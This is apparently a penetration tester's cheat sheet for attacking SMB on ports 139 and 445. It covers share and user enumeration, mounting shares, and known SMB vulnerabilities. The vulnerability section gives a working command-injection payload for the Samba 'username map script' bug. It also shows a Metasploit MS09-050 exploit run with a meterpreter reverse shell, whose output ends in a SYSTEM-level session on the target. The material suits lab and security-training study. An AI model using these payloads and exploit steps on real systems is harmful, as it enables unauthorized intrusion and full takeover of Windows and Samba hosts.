# smb 139,445

## SMB Enumeration

### Guess Server's Version

``` bash
nmap -p 139,445 $ip --script=smb-os-discovery
```

Detect Server's version using nmap features.

``` bash
nmap -A 10.10.10.4
```

### Scanning

smbclient

``` bash
smbclient -NL //ip
```

``` bash
smbclient -L ip --port=445 --user=Administrator
```

smbmap

``` bash
smbmap -H $ip
```

``` bash
smbmap -u <user> -H $ip
```

### Scanning Vul

``` bash
nmap -p 139,445 --script smb-vul* $ip
```

### Other Tools

NetBIOS information

``` bash
nbtscan -r $ip
```

enum4linux

``` bash
enum4linux -a $ip
```

rpcclient

``` bash
rpcclient -U "" $ip
```
## Connect to SMB

### smbclient

``` bash
smbclient //ip/folder
```

``` bash
smbclient \\\\ip\\folder -U john 
```

### smbmap

``` bash
smbmap -H 192.168.11.135 -u windows_10_1903_x64 -p passwd -r 'Users\windows_10_1903_x64\Desktop'
```

### Mount Access

``` bash
sudo mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//ip/My Share" /mnt/cifs
```

``` bash
sudo mount -t cifs -o username=Administrator,password=123456 /mnt/win10_share -o port=445 //ip/Data
```

``` bash
sudo mount -o nolock $ip:/home ~/home/
```

### Windows

``` bash
\\ip\a\whoami.exe
```

## SMB Commands

``` bash
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
```

## Config Samba

`/etc/samba/smb.conf`

``` txt
min protocol = SMB1
```

## SMB CVE

### Samba 3.0.20 < 3.0.25rc3 - 'Username' map script'

[https://www.exploit-db.com/exploits/16320](https://www.exploit-db.com/exploits/16320)

``` bash
smbmap -u '/=`ping -c 2 ip`' -H ip
```

### smb-vuln-cve2009-3103

Using python exploit but not complete, exploit [here](https://github.com/leecybersec/private-machines/blob/master/pg/warm-up/Internal_smb-vuln-cve2009-3103/MS09_050.py)

ExploitDB: [https://www.exploit-db.com/exploits/40280](https://www.exploit-db.com/exploits/40280)

``` bash
$ python3 MS09_050.py ip
Enter WORKGROUP\Administrator's password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

``` bash
$ sudo msfconsole -q
use exploit/multi/handler
set lhost tun0
set lport 445
set EXITFUNC thread
run
```

Using msfconsole

``` bash
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  ip    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     445              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on ip
[*] ip:445 - Connecting to the target (ip:445)...
[*] ip:445 - Sending the exploit packet (951 bytes)...
[*] ip:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (175174 bytes) to ip
[*] Meterpreter session 2 opened (ip:445 -> ip:49159) at 2021-07-06 23:40:40 +0700

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```